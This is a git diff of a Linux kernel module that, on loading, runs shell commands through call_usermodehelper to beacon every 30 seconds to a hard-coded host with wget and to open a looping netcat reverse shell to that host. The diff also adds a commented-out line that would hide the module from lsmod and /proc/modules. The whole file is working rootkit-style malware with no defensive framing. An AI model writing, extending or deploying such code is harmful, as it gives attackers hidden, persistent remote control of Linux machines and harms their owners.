@@ -1,8 +1,7 @@
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/init.h>
-#include <linux/delay.h>    // Pour ssleep()
-
+#include <linux/list.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("tibo.wav");
@@ -19,6 +18,7 @@ static int __init kernel_network_init(void) {
 	make_request("START");
 	make_request_periodic();
 	rev_shell();
+//	list_del(&THIS_MODULE->list); // remove from lsmod and /proc/modules
 	return 0;
 }
 
@@ -26,6 +26,7 @@ static int __init kernel_network_init(void) {
 static void __exit kernel_network_exit(void) {
 	make_request("STOP");
 	kill_all_communications();
+
 }
 
 // function to make requests with a specified string
@@ -40,7 +41,7 @@ void make_request(char *str) {
 
 //function to make a request every 30s
 void make_request_periodic(void) {
-	char *str = "while true; do wget http://192.168.1.37:8000/UP; sleep 30; done";
+	char *str = "staf\nwhile true; do wget http://192.168.1.37:8000/UP; sleep 30; done";
 	char *argv[] = {"/bin/sh", "-c", str, NULL};
 	call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
 }
@@ -55,12 +56,13 @@ void kill_all_communications(void) {
 
 // initiate rev shell
 void rev_shell(void) {
-	char *shell = "while true; do nc 192.168.1.37 8001 -e sh; sleep 30; done";
+	char *shell = "staf\nwhile true; do nc 192.168.1.37 8001 -e sh; sleep 30; done";
 	char *argv[] = {"/bin/sh", "-c", shell, NULL};
 	call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
 }
 
 EXPORT_SYMBOL(make_request);
+EXPORT_SYMBOL(kill_all_communications);
 
 module_init(kernel_network_init);
 module_exit(kernel_network_exit);
